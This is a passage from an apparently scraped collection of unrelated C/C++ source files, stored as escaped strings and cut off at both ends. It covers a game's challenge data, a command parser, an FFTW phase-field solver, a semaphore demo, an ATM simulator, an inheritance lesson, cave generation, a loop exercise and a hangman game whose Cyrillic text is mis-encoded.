(sys->getPlayCommonData()->challenge_checkKunsho(i)) {\n\t\t\t\tdisplayData->setDisplayFlag(PlayChallengeGameData::CourseState::CSF_IsKunsho);\n\t\t\t}\n\t\t}\n\t}\n\n\tfor (int i = 0; i < 5; i++) {\n\t\tsys->getPlayCommonData()->challenge_get_CourseState(i);\n\t}\n\n\tfor (int i = 0; i < getVsStageNum(); i++) {\n\t\tVs2D_TitleInfo::Info* displayData = (*mVsTitleInfo)(i);\n\t\tVsGame::StageData* fileData       = mSection",
    "#include \"CommandExecutor.h\"\n\n#include \"Command_Unlock.h\"\n#include \"Command_Broadcast.h\"\n#include \"Command_Lock.h\"\n#include \"Command_ExecLocalCmd.h\"\n#include \"Command_CloseBroadCast.h\"\n#include <stack>\n#include <map>\n\n#include <iostream>\n#define T(q) TEXT(q)\n\nusing std::stack;\nusing std::map;\n\nCommandExecutor::CommandExecutor() {\n\tthis->registerNewCmd(new Command_Lock());\n\tthis->registerNewCmd(new Command_Unlock());\n\tthis->registerNewCmd(new Command_Broadcast());\n\tthis->registerNewCmd(new Command_ExecLocalCmd());\n\tthis->registerNewCmd(new Command_CloseBc());\n}\n\nLRESULT CommandExecutor::registerNewCmd(BaseCommand* cmd) {\n\tthis->commands.push_back(cmd);\n\treturn 0;\n}\n\nLRESULT  CommandExecutor::execCmd(wstring cmd, vector<any>& ret) {\n\tcmd.erase(0, cmd.find_first_not_of(TEXT(' ')));\n\tcmd.erase(cmd.find_last_not_of(TEXT(' '))+1);\n\tif (cmd.empty()) return -2;\n\n\tvector<wstring> cmds = vector<wstring>();\n\twstring temp = T(\"\");\n\twchar_t target[2] = { '\\\"','\\'' };\n\n\tstack<wchar_t> chrs = stack<wchar_t>();\n\tcmd += TEXT(\" \");\n\n\tfor (int i=0;i<cmd.size();i++) {\n\t\tif (cmd[i] == T('\\'')) {\n\t\t\tif (chrs.size() == 0 || chrs.top() != '\\'') {\n\t\t\t\tif(chrs.size() == 0) //\u4e0d\u5728\u5b57\u7b26\u4e32\u4e2d\n\t\t\t\t\tchrs.push('\\'');\n\t\t\t\telse\n\t\t\t\t\ttemp += cmd[i];\n\t\t\t}\n\t\t\telse {\n\t\t\t\tchrs.pop();\n\t\t\t};\n\t\t}\n\t\telse if (cmd[i] == T('\\\"')) {\n\t\t\tif (chrs.size() == 0 || chrs.top() != '\"') {\n\t\t\t\tif (chrs.size() == 0) //\u4e0d\u5728\u5b57\u7b26\u4e32\u4e2d\n\t\t\t\t\tchrs.push('\"');\n\t\t\t\telse\n\t\t\t\t\ttemp += cmd[i];\n\t\t\t}\n\t\t\telse {\n\t\t\t\tchrs.pop();\n\t\t\t}\n\t\t} else if (cmd[i] == T(' ') && chrs.size() == 0) {\n\t\t\tcmds.push_back(temp);\n\t\t\ttemp = T(\"\");\n\t\t} else {\n\t\t\ttemp += cmd[i];\n\t\t}\n\t}\n\n\tif (chrs.size() != 0) return -1;\n\n\tvector<wstring> args;\n\tif (cmds.size() > 1) {\n\t\targs = vector<wstring>(cmds.begin() + 1, cmds.end());\n\t}\n\treturn this->execCmdArgs(cmds[0],args,ret);\n}\n\nLRESULT CommandExecutor::execCmdArgs(wstring trigger, vector<wstring> args,vector<any>& ret) {\n\tLRESULT res = -2;\n\tBaseCommand* cmd = NULL;\n\n\tfor (BaseCommand* i : this->commands) {\n\t\tif (i->isInTrigger(trigger)) {\n\t\t\tcmd = i;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t\n\tif (cmd != NULL) {\n\t\tres = cmd->ExecCmd(args,ret);\n\t}\n\treturn res;\n}",
    "\ufeff/**\n * @Author: Your name\n * @Date:   2024-09-15 11:09:40\n * @Last Modified by:   Your name\n * @Last Modified time: 2024-09-16 14:55:16\n */\n#include\"head.h\"\n#include\"basefun.h\"\n#include\"DGSolver.h\"\n#pragma comment (lib, \"libfftw3-3.lib\")\n#pragma comment (lib, \"libfftw3f-3.lib\")\n#pragma comment (lib, \"libfftw3l-3.lib\")\n\nint main()\n{\n\tint Nx = 64;\n\tint Ny = 64;\n\tint Nz = 64;\n\tint dim, Dim;\n\tdouble c, dt, tau, gamma;\n\tfftw_plan plan_r2c_forward, plan_c2r_backward;\n\n\tint RealSize = Nx * Ny * Nz;\n\tint ImagSize = Nx * Ny * (Nz / 2 + 1);\n\tfftw_complex* Phi_hat = fn_vec_init_cplx<fftw_complex>(ImagSize);\n\tfftw_complex* Phi_hat_t = fn_vec_init_cplx<fftw_complex>(ImagSize);\n\tfftw_complex* LB_Nonlinear_terms_hat = fn_vec_init_cplx<fftw_complex>(ImagSize);\n\tfftw_complex* LB_gradient = fn_vec_init_cplx<fftw_complex>(ImagSize);\n\tfftw_complex* LB_e2_hat = fn_vec_init_cplx<fftw_complex>(ImagSize);\n\tfftw_complex* LB_e_hat = fn_vec_init_cplx<fftw_complex>(ImagSize);\n\n\tdouble* Phi = fn_vec_init<double>(RealSize);\n\tdouble* Phi2 = fn_vec_init<double>(RealSize);\n\tdouble* Phi3 = fn_vec_init<double>(RealSize);\n\tdouble* Phi4 = fn_vec_init<double>(RealSize);\n\tdouble* LB_Nonlinear_terms = fn_vec_init<double>(RealSize);\n\tdouble* LB_e2 = fn_vec_init<double>(RealSize);\n\tdouble* LB_e = fn_vec_init<double>(RealSize);\n\t\n\tDGSolver solver_normal(Nx, Ny, Nz);\n\tsolver_normal.set_para(&dim, &Dim, &c, &dt, &tau, &gamma);\n\tdouble** ProjMatrix = fn_mat_init<double>(dim, Dim);\n\tdouble** pk = fn_mat_init<double>(Nx * Ny * (Nz / 2 + 1), dim);\n\tdouble* pk2 = fn_vec_init<double>(Nx * Ny * (Nz / 2 + 1));\n\tdouble* kt = fn_vec_init<double>(Nx * Ny * (Nz / 2 + 1));\n\tdouble* ktmp = fn_vec_init<double>(Nx * Ny * (Nz / 2 + 1));\n\tdouble* kt_gradient = fn_vec_init<double>(Nx * Ny * (Nz / 2 + 1));\n\n\tsolver_normal.ProjMatrix(ProjMatrix);\n\tsolver_normal.get_kspace(ProjMatrix, pk, pk2, kt, ktmp, kt_gradient);\n\tsolver_normal.fftw_plan_initial(&plan_r2c_forward, &plan_c2r_backward, Phi, Phi_hat);\n\tsolver_normal.get_initial_value(Phi_hat);\n\tfftw_execute_dft_c2r(plan_c2r_backward, Phi_hat, Phi);\n\n\tsolver_normal.get_initial_value(Phi_hat);// The previous step will change the value of Phi_hat\n\t\n\tmultiply_xy(Phi, Phi, Phi2, Nx * Ny * Nz);\n\tmultiply_xy(Phi, Phi2, Phi3, Nx * Ny * Nz);\n\tmultiply_xy(Phi, Phi3, Phi4, Nx * Ny * Nz);\n\t\n\tfor (int j1 = 0; j1 < Nx * Ny * Nz; j1++) {\n\t\tLB_Nonlinear_terms[j1] = 0.5 * gamma * Phi2[j1] - Phi3[j1] / 6.0 - tau * Phi[j1];\n\t}\n\t\n\tfftw_execute_dft_r2c(plan_r2c_forward, LB_Nonlinear_terms, LB_Nonlinear_terms_hat);\n\taverage_fourier(LB_Nonlinear_terms_hat, Nx * Ny * (Nz / 2 + 1), Nx * Ny * Nz);\n\tdouble energy, gradient = 1.0, energy0 = 0.0, energy_err = 1.0;\n\tint iter = 0;\n\tdouble tol = 1e-14;\n\tint Iter_max = 3000;\n\tdouble* Gradient = fn_vec_init<double>(Iter_max);\n\tdouble* Energy = fn_vec_init<double>(Iter_max);\n\twhile (energy_err > tol && iter < Iter_max)\n\t{\n\t\titer = iter + 1;\n\n\t\tfor (int j1 = 0; j1 < Nx * Ny * (Nz / 2 + 1); j1++) {\n\t\t\tPhi_hat_t[j1][0] = (Phi_hat[j1][0] + dt * LB_Nonlinear_terms_hat[j1][0]) / ktmp[j1];\n\t\t\tPhi_hat_t[j1][1] = (Phi_hat[j1][1] + dt * LB_Nonlinear_terms_hat[j1][1]) / ktmp[j1];\n\t\t}\n\t\tPhi_hat_t[0][0] = 0.0;\n\t\tPhi_hat_t[0][1] = 0.0;\n\t\t\n\t\tfor (int j1 = 0; j1 < Nx * Ny * (Nz / 2 + 1); j1++) {\n\t\t\tLB_gradient[j1][0] = fabs(Phi_hat_t[j1][0] - Phi_hat[j1][0]) / dt;\n\t\t\tLB_gradient[j1][1] = fabs(Phi_hat_t[j1][1] - Phi_hat[j1][1]) / dt;\n\t\t}\n\t\tfor (int j1 = 0; j1 < Nx * Ny * (Nz / 2 + 1); j1++) {\n\t\t\tPhi_hat[j1][0] = Phi_hat_t[j1][0];\n\t\t\tPhi_hat[j1][1] = Phi_hat_t[j1][1];\n\t\t}\n\n\t\tgradient = Max(LB_gradient, Nx * Ny * (Nz / 2 + 1));\n\t\tGradient[iter - 1] = gradient;\n\t\t\n\t\tfor (int j1 = 0; j1 < Nx * Ny * (Nz / 2 + 1); j1++) {\n\t\t\tLB_e2_hat[j1][0] = kt[j1] * Phi_hat_t[j1][0];\n\t\t\tLB_e2_hat[j1][1] = kt[j1] * Phi_hat_t[j1][1];\n\t\t}\n\t\tfftw_execute_dft_c2r(plan_c2r_backward, Phi_hat_t, Phi);\n\t\tmultiply_xy(Phi, Phi, Phi2, Nx * Ny * Nz);\n\t\tmultiply_xy(Phi2, Phi, Phi3, Nx * Ny * Nz);\n\t\tmultiply_xy(Phi3, Phi, Phi4, Nx * Ny * Nz);\n\t\tfor (int j1 = 0; j1 < Nx * Ny * Nz; j1++) {\n\t\t\tLB_Nonlinear_terms[j1] = 0.5 * gamma * Phi2[j1] - Phi3[j1] / 6.0 - tau * Phi[j1];\n\t\t}\n\t\t\n\t\tfftw_execute_dft_r2c(plan_r2c_forward, LB_Nonlinear_terms, LB_Nonlinear_terms_hat);\n\t\taverage_fourier(LB_Nonlinear_terms_hat, Nx * Ny * (Nz / 2 + 1), Nx * Ny * Nz);\n\n\t\tfftw_execute_dft_c2r(plan_c2r_backward, LB_e2_hat, LB_e2);\n\t\tmultiply_xy(LB_e2, LB_e2, LB_e, Nx * Ny * Nz);\n\t\tfor (int j1 = 0; j1 < Nx * Ny * Nz; j1++) {\n\t\t\tLB_e[j1] = c * LB_e[j1] / 2.0 + tau * Phi2[j1] / 2.0 - gamma * Phi3[j1] / 6.0 + Phi4[j1] / 24.0;\n\t\t}\n\t\tfftw_execute_dft_r2c(plan_r2c_forward, LB_e, LB_e_hat);\n\t\taverage_fourier(LB_e_hat, Nx * Ny * (Nz / 2 + 1), Nx * Ny * Nz);\n\n\t\tenergy = **LB_e_hat;\n\t\t*(Energy + iter - 1) = energy;\n\t\tenergy_err = fabs(energy - energy0);\n\t\tenergy0 = energy;\n\t\tstd::cout << \"iter = \" << iter << \" \";\n\t\tstd::cout << \"gradient = \" << std::scientific << gradient << \" \";\n\t\tstd::cout << std::setprecision(15) << \"energy = \" << energy << \" \";\n\t\tstd::cout << std::setprecision(6) << \"energy_",
    "#include <stdio.h>\r\n#include <pthread.h>\r\n#include <semaphore.h>\r\n#include <unistd.h>\r\n\r\n#define MAX_READERS 5\r\n#define MAX_WRITERS 5\r\n\r\n// Shared resource (e.g., database)\r\nint sharedResource = 0;\r\n\r\n// Semaphores\r\nsem_t mutex;          // Controls access to the shared resource\r\nsem_t readerMutex;    // Controls access to the reader count\r\nsem_t writerMutex;    // Controls access to the writer count\r\n\r\nint readerCount = 0;  // Number of readers currently accessing the resource\r\n\r\n// Reader function\r\nvoid *reader(void *arg) {\r\n    int readerID = *((int *)arg);\r\n\r\n    while (1) {\r\n        // Entry section\r\n        sem_wait(&readerMutex);\r\n        readerCount++;\r\n        if (readerCount == 1) {\r\n            sem_wait(&mutex);  // First reader acquires the resource lock\r\n        }\r\n        sem_post(&readerMutex);\r\n\r\n        // Critical section\r\n        printf(\"Reader %d is reading: %d\\n\", readerID, sharedResource);\r\n        sleep(1); // Simulate reading\r\n\r\n        // Exit section\r\n        sem_wait(&readerMutex);\r\n        readerCount--;\r\n        if (readerCount == 0) {\r\n            sem_post(&mutex);  // Last reader releases the resource lock\r\n        }\r\n        sem_post(&readerMutex);\r\n\r\n        // Non-critical section\r\n        sleep(2); // Simulate other activities\r\n    }\r\n\r\n    pthread_exit(NULL);\r\n}\r\n\r\n// Writer function\r\nvoid *writer(void *arg) {\r\n    int writerID = *((int *)arg);\r\n\r\n    while (1) {\r\n        // Entry section\r\n        sem_wait(&writerMutex);\r\n        sem_wait(&mutex);  // Writer acquires the resource lock\r\n        sem_post(&writerMutex);\r\n\r\n        // Critical section\r\n        sharedResource++;\r\n        printf(\"Writer %d is writing: %d\\n\", writerID, sharedResource);\r\n        sleep(1); // Simulate writing\r\n\r\n        // Exit section\r\n        sem_post(&mutex);  // Writer releases the resource lock\r\n\r\n        // Non-critical section\r\n        sleep(3); // Simulate other activities\r\n    }\r\n\r\n    pthread_exit(NULL);\r\n}\r\n\r\nint main() {\r\n    // Initialize semaphores\r\n    sem_init(&mutex, 0, 1);\r\n    sem_init(&readerMutex, 0, 1);\r\n    sem_init(&writerMutex, 0, 1);\r\n\r\n    // Create reader threads\r\n    pthread_t readerThreads[MAX_READERS];\r\n    int readerIDs[MAX_READERS];\r\n    for (int i = 0; i < MAX_READERS; i++) {\r\n        readerIDs[i] = i + 1;\r\n        pthread_create(&readerThreads[i], NULL, reader, (void *)&readerIDs[i]);\r\n    }\r\n\r\n    // Create writer threads\r\n    pthread_t writerThreads[MAX_WRITERS];\r\n    int writerIDs[MAX_WRITERS];\r\n    for (int i = 0; i < MAX_WRITERS; i++) {\r\n        writerIDs[i] = i + 1;\r\n        pthread_create(&writerThreads[i], NULL, writer, (void *)&writerIDs[i]);\r\n    }\r\n\r\n    // Join threads\r\n    for (int i = 0; i < MAX_READERS; i++) {\r\n        pthread_join(readerThreads[i], NULL);\r\n    }\r\n    for (int i = 0; i < MAX_WRITERS; i++) {\r\n        pthread_join(writerThreads[i], NULL);\r\n    }\r\n\r\n    // Destroy semaphores\r\n    sem_destroy(&mutex);\r\n    sem_destroy(&readerMutex);\r\n    sem_destroy(&writerMutex);\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include <iostream>\n#include <iomanip>   // for formatting\n#include <string>\n#include <limits>    // for input validation\n#include <unistd.h>  // for sleep function (optional delay)\n#include <vector>    // for storing transaction history\n\nusing namespace std;\n\nclass ATM {\nprivate:\n    string username;\n    int pin;\n    double balance;\n    vector<string> transactionHistory;  // To store the user's transaction history\n    int failedLoginAttempts = 0;        // Counter for failed login attempts\n\npublic:\n    ATM(string user, int p, double bal) : username(user), pin(p), balance(bal) {}\n\n    bool login(int inputPin) {\n        if (failedLoginAttempts >= 3) {\n            cout << \"Your account has been locked due to multiple failed attempts.\\n\";\n            return false;\n        }\n        if (pin == inputPin) {\n            failedLoginAttempts = 0;\n            return true;\n        } else {\n            failedLoginAttempts++;\n            return false;\n        }\n    }\n\n    void displayHeader() {\n        cout << \"============================================\\n\";\n        cout << \"=              WELCOME TO ATM              =\\n\";\n        cout << \"============================================\\n\\n\";\n    }\n\n    void displayFooter() {\n        cout << \"\\n============================================\\n\";\n        cout << \"=       THANK YOU FOR USING OUR ATM        =\\n\";\n        cout << \"============================================\\n\";\n    }\n\n    void displayMainMenu() {\n        cout << \"********************************************\\n\";\n        cout << \"*                 MAIN MENU                *\\n\";\n        cout << \"********************************************\\n\";\n        cout << \"*  1. Check Balance                        *\\n\";\n        cout << \"*  2. Deposit Money                        *\\n\";\n        cout << \"*  3. Withdraw Money                       *\\n\";\n        cout << \"*  4. View Transaction History             *\\n\";\n        cout << \"*  5. Change PIN                           *\\n\";\n        cout << \"*  6. Exit                                 *\\n\";\n        cout << \"********************************************\\n\";\n        cout << \"Please choose an option: \";\n    }\n\n    void checkBalance() {\n        cout << \"\\n============================================\\n\";\n        cout << \"=              CURRENT BALANCE             =\\n\";\n        cout << \"============================================\\n\";\n        cout << \"=        Your balance: $ \" << fixed << setprecision(2) << balance << \"        =\\n\";\n        cout << \"============================================\\n\\n\";\n        sleep(2);\n    }\n\n    void depositMoney() {\n        double amount;\n        cout << \"\\n============================================\\n\";\n        cout << \"=               DEPOSIT MONEY              =\\n\";\n        cout << \"============================================\\n\";\n        cout << \"Enter the amount to deposit: $\";\n        cin >> amount;\n\n        // Input validation\n        while (cin.fail() || amount <= 0) {\n            cout << \"Invalid input! Please enter a valid amount: $\";\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n            cin >> amount;\n        }\n\n        balance += amount;\n        transactionHistory.push_back(\"Deposited: $\" + to_string(amount));\n        cout << \"\\nDeposit successful! Your new balance is $\" << fixed << setprecision(2) << balance << \"\\n\";\n        cout << \"============================================\\n\\n\";\n        sleep(2);\n    }\n\n    void withdrawMoney() {\n        double amount;\n        cout << \"\\n============================================\\n\";\n        cout << \"=              WITHDRAW MONEY              =\\n\";\n        cout << \"============================================\\n\";\n        cout << \"Enter the amount to withdraw: $\";\n        cin >> amount;\n\n        // Input validation\n        while (cin.fail() || amount <= 0) {\n            cout << \"Invalid input! Please enter a valid amount: $\";\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n            cin >> amount;\n        }\n\n        if (amount > balance) {\n            cout << \"\\nInsufficient balance! You have only $\" << fixed << setprecision(2) << balance << \" available.\\n\";\n        } else {\n            balance -= amount;\n            transactionHistory.push_back(\"Withdrew: $\" + to_string(amount));\n            cout << \"\\nWithdrawal successful! Your new balance is $\" << fixed << setprecision(2) << balance << \"\\n\";\n        }\n        cout << \"============================================\\n\\n\";\n        sleep(2);\n    }\n\n    void viewTransactionHistory() {\n        cout << \"\\n============================================\\n\";\n        cout << \"=           TRANSACTION HISTORY            =\\n\";\n        cout << \"============================================\\n\";\n        if (transactionHistory.empty()) {\n            cout << \"No transactions available.\\n\";\n        } else {\n            for (const auto& transaction : transactionHistory) {\n ",
    "//  main.cpp\n//  Created by Ali Behfarnia on 09/16/24.\n\n// [4] OOP: Inheritance\n// It allows a new class to derive methods and attributes \n// from an existing class.\n// Idea: code reusability and  hierarchical relationships\n\n\n#include <iostream>\n#include <cmath>\n#include <cstdlib>\n#include <ctime>\n\nusing namespace std;\n\nclass AbstEmp {\n    virtual void ask_promotion() = 0;\n    virtual void ask_alphabet() = 0;\n};\n\n\nclass Employee:AbstEmp {\nprivate:\n    string Name;\n    string Company;\n    int Age;\n        \npublic:\n//    string Name;\n//    string Company;\n//    int Age;\n    \n    Employee(string name, string company, int agee) {\n        Name = name;\n        Company = company;\n        Age = agee;\n    }\n        \n    void introduce() {\n        cout << \"Name = \" << Name << endl;\n        cout << \"Company = \" << Company << endl;\n        cout << \"Email = \" << Name + \"@\" + Company + \".com\" << endl;\n        cout << \"Age = \" << Age << endl;\n    }\n    \n    // Name: Setter and Getter\n    void set_name(string nm){//setter\n        Name = nm;\n    }\n    string get_name(){//getter\n        return Name;\n    }\n    \n    // Company: Setter and Getter\n    void set_company(string comp){//setter\n        Company = comp;\n    }\n    string get_company(){//getter\n        return Company;\n    }\n    \n    void set_age(int agee){//setter\n        if(agee>=18)\n        Age = agee;\n    }\n    int get_age(){//getter\n        return Age;\n    }\n    \n    void ask_promotion() {\n        if (Age>30 && Age< 80)\n            cout << Name << \" Got Promoted!\" << endl;\n        else\n            cout << Name << \", Sorry, no promotion for you! \" << endl;\n    }\n    \n    void ask_alphabet() {\n        if (Name == \"Ali\")\n            cout << \"Yes, his name is \" << Name + '.'<< endl;\n        else\n            cout << \"No, his name is NOT \" << Name + '.' <<endl;\n                    \n    }\n};\n\n\nclass Developer: public Employee{ //note: if we don't put public in this line, we cannot use other functions like ask_promotion\npublic:\n    string fav_prog;\n    Developer(string nm, string com, int agwwee, string prog)\n    : Employee(nm, com, agwwee){\n        fav_prog = prog;\n    }\n    \n    void fix_bug(){\n        cout << get_name() << \" fixed bugs using \" << fav_prog +'.' << endl;\n    }\n};\n\n\nclass Teacher: public Employee {\npublic:\n    string subject;\n    Teacher(string nm, string com, int agee, string sub)\n    : Employee(nm, com, agee){\n        subject = sub;\n    }\n    \n    void preprare_lesson(){\n        cout << get_name() << \" is preparing \" << subject << \" lessons.\" << endl;\n    }\n    \n};\n\n\nint main() {\n    \n    Developer dev1 = Developer(\"Akbar\", \"Amazon\", 35, \"C++\");\n    dev1.fix_bug();\n    dev1.ask_promotion(); //note: if we don't put public in this line, we cannot use other functions like ask_promotion\n    \n    cout << \"+++\" <<endl;\n    \n    Teacher tech1 = Teacher(\"AB\", \"WSU\", 88, \"VHDL\");\n    tech1.preprare_lesson();\n    tech1.ask_promotion();\n    \n    return 0;\n}\n",
    "#include \"world/level/levelgen/feature/CaveFeature.h\"\n\n#include \"world/level/Level.h\"\n\n#include \"world/level/tile/Tile.h\"\n#include \"world/level/tile/GrassTile.h\"\n#include \"world/level/tile/DirtTile.h\"\n\n#include \"util/Mth.h\"\n\nbool CaveFeature::place(Level &level, Random &random, int_t x, int_t y, int_t z)\n{\n\tfloat f = random.nextFloat() * Mth::PI;\n\tdouble d1 = 8.0;\n\tdouble d2 = (x + 8) + Mth::sin(f) * d1;\n\tdouble d3 = (x + 8) - Mth::sin(f) * d1;\n\tdouble d4 = (z + 8) + Mth::cos(f) * d1;\n\tdouble d5 = (z + 8) - Mth::cos(f) * d1;\n\tdouble d6 = (y + random.nextInt(8) + 2);\n\tdouble d7 = (y + random.nextInt(8) + 2);\n\tdouble d8 = random.nextDouble() * 4.0 + 2.0;\n\tdouble d9 = random.nextDouble() * 0.6;\n\tlong_t l = random.nextLong();\n\trandom.setSeed(l);\n\n\tstd::vector<TilePos> arrayList;\n\t\n\tfor (int_t b = 0; b <= 16; b++)\n\t{\n\t\tdouble d10 = d2 + (d3 - d2) * b / 16.0;\n\t\tdouble d11 = d6 + (d7 - d6) * b / 16.0;\n\t\tdouble d12 = d4 + (d5 - d4) * b / 16.0;\n\t\tdouble d13 = random.nextDouble();\n\t\tdouble d14 = (Mth::sin(b / 16.0F * Mth::PI) * d8 + 1.0) * d13 + 1.0;\n\t\tdouble d15 = (Mth::sin(b / 16.0F * Mth::PI) * d8 + 1.0) * d13 + 1.0;\n\t\tfor (int_t i = d10 - d14 / 2.0; i <= d10 + d14 / 2.0; i++)\n\t\t{\n\t\t\tfor (int_t j = d11 - d15 / 2.0; j <= d11 + d15 / 2.0; j++)\n\t\t\t{\n\t\t\t\tfor (int_t k = d12 - d14 / 2.0; k <= d12 + d14 / 2.0; k++)\n\t\t\t\t{\n\t\t\t\t\tdouble d16 = (i + 0.5 - d10) / d14 / 2.0;\n\t\t\t\t\tdouble d17 = (j + 0.5 - d11) / d15 / 2.0;\n\t\t\t\t\tdouble d18 = (k + 0.5 - d12) / d14 / 2.0;\n\t\t\t\t\tif (d16 * d16 + d17 * d17 + d18 * d18 < random.nextDouble() * d9 + 1.0 - d9 && !level.isEmptyTile(i, j, k))\n\t\t\t\t\t{\n\t\t\t\t\t\tfor (int m = i - 2; m <= i + 1; m++)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tfor (int n = j - 1; n <= j + 1; n++)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tfor (int i1 = k - 1; i1 <= k + 1; i1++)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tif (m <= x || i1 <= z || m >= x + 16 - 1 || i1 >= z + 16 - 1)\n\t\t\t\t\t\t\t\t\t\treturn false;\n\t\t\t\t\t\t\t\t\tif (level.getMaterial(m, n, i1).isLiquid())\n\t\t\t\t\t\t\t\t\t\treturn false;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tarrayList.emplace_back(i, j, k);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tfor (auto &tilePos : arrayList)\n\t\tlevel.setTileNoUpdate(tilePos.x, tilePos.y, tilePos.z, 0);\n\n\tfor (auto &tilePos : arrayList)\n\t{\n\t\tif (level.getTile(tilePos.x, tilePos.y - 1, tilePos.z) == Tile::dirt.id && level.getRawBrightness(tilePos.x, tilePos.y, tilePos.z) > 8)\n\t\t\tlevel.setTileNoUpdate(tilePos.x, tilePos.y - 1, tilePos.z, Tile::grass.id);\n\t}\n\treturn true;\n}\n",
    "/*\r\n* A for loop is a programming language statement which allows code to be repeatedly executed.\r\n\r\n? The syntax is\r\n\r\n* for ( <expression_1> ; <expression_2> ; <expression_3> )\r\n!    <statement>\r\n* expression_1 is used for intializing variables which are generally used for controlling the terminating flag for the loop.\r\n* expression_2 is used to check for the terminating condition. If this evaluates to false, then the loop is terminated.\r\n* expression_3 is generally used to update the flags/variables.\r\n!A sample loop is\r\n\r\n? for(int i = 0; i < 10; i++) {\r\n    ...\r\n*}\r\n* In this challenge, you will use a for loop to increment a variable through a range.\r\n\r\n!Input Format\r\n\r\n* You will be given two positive integers,  and  (), separated by a newline.\r\n\r\n!Output Format\r\n\r\n* For each integer  in the inclusive interval :\r\n\r\n* If , then print the English representation of it in lowercase. That is \"one\" for , \"two\" for , and so on.\r\n* Else if  and it is an even number, then print \"even\".\r\n* Else if  and it is an odd number, then print \"odd\".\r\n* Note: \r\n\r\n! Sample Input\r\n\r\n? 8\r\n? 11\r\n!Sample Output\r\n\r\n? eight\r\n? nine\r\n? even\r\n? odd\r\n? Language\r\n? C++11\r\n? More\r\n? 12345678910111213141516171819202122232425\r\n? Line: 30 Col: 1\r\n\r\n*Test against custom input\r\n\r\n*/\r\n\r\n#include <iostream>\r\n#include <cstdio>\r\nusing namespace std;\r\n\r\nint main() {\r\n    // Complete the code.\r\n    int a, b;\r\n    // Input two integers\r\n    cin >> a >> b;\r\n    \r\n    // Array to store the English words for numbers from 1 to 9\r\n    string numbers[] = {\"\", \"one\", \"two\", \"three\", \"four\", \"five\", \"six\", \"seven\", \"eight\", \"nine\"};\r\n\r\n    // Loop from a to b (inclusive)\r\n    for (int i = a; i <= b; i++) {\r\n        if (i >= 1 && i <= 9) {\r\n            // Print the English representation of numbers between 1 and 9\r\n            cout << numbers[i] << endl;\r\n        } else {\r\n            // If greater than 9, check for even or odd\r\n            if (i % 2 == 0) {\r\n                cout << \"even\" << endl;\r\n            } else {\r\n                cout << \"odd\" << endl;\r\n            }\r\n        }\r\n    }\r\n    return 0;\r\n}",
    "\n#include \"functions declaration.hpp\"\nusing namespace std;\n\nvoid welcome()\n{\n    std::cout << \"=====================\\n\";\n        std::cout << \"\\t\u00c2\u00e8\u00f1\u00e5\u00eb\u00e8\u00f6\u00e0\\n\";\n    std::cout << \"=====================\\n\";\n    std::cout << \"\u00cf\u00f0\u00e0\u00e2\u00e8\u00eb\u00e0: \u00ce\u00f2\u00e3\u00e0\u00e4\u00e0\u00e9\u00f2\u00e5 \u00e7\u00e0\u00e3\u00e0\u00e4\u00e0\u00ed\u00ed\u00ee\u00e5 \u00f1\u00eb\u00ee\u00e2\u00ee \u00e4\u00ee \u00f2\u00ee\u00e3\u00ee \u00ea\u00e0\u00ea \u00e2\u00e8\u00f1\u00e5\u00eb\u00e8\u00f6\u00e0 \u00e1\u00f3\u00e4\u00e5\u00f2 \u00ed\u00e0\u00f0\u00e8\u00f1\u00ee\u00e2\u00e0\u00ed\u00e0.\\n\";\n}\nint selectdifficilty()\n{\n    int difficlty=0;\n    std::cout << \"\u00c2\u00fb\u00e1\u00e5\u00f0\u00e8\u00f2\u00e5 \u00f3\u00f0\u00ee\u00e2\u00e5\u00ed\u00fc \u00f1\u00eb\u00ee\u00e6\u00ed\u00ee\u00f1\u00f2\u00e8: 2) \u00eb\u00b8\u00e3\u00ea\u00e8\u00e9 3) \u00f2\u00ff\u00e6\u00b8\u00eb\u00fb\u00e9\";\n    std::cin >> difficlty;\n    system(\"cls\");\n    return difficlty;\n    int attempt=0;\n    if (attempt == 0)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= \\n\";\n    }\n    else if (attempt == 1)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"  O   | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= \\n\";\n    }\n    else if (attempt == 2)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"  O   | \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= \\n\";\n    }\n    else if (attempt == 3)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"  O   | \\n\";\n        std::cout << \" /|   | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= \\n\";\n    }\n    else if (attempt == 4)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"  O   | \\n\";\n        std::cout << \" /|\\\\  | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= \\n\";\n    }\n    else if (attempt == 5)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"  O   | \\n\";\n        std::cout << \" /|\\\\  | \\n\";\n        std::cout << \" /    | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= \\n\";\n    }\n    else if (attempt == 6)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"  O   | \\n\";\n        std::cout << \" /|\\\\  | \\n\";\n        std::cout << \" / \\\\  | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= 